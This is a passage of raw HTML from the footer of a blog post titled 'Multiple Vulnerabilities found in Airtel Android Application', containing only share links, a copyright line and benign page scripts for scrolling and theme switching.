aria-label="share Multiple Vulnerabilities found in Airtel Android Application on whatsapp" href="https://api.whatsapp.com/send?text=Multiple%20Vulnerabilities%20found%20in%20Airtel%20Android%20Application%20-%20https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Multiple Vulnerabilities found in Airtel Android Application on telegram" href="https://telegram.me/share/url?text=Multiple%20Vulnerabilities%20found%20in%20Airtel%20Android%20Application&url=https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://offsec.space/>Gaurang Bhatnagar</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>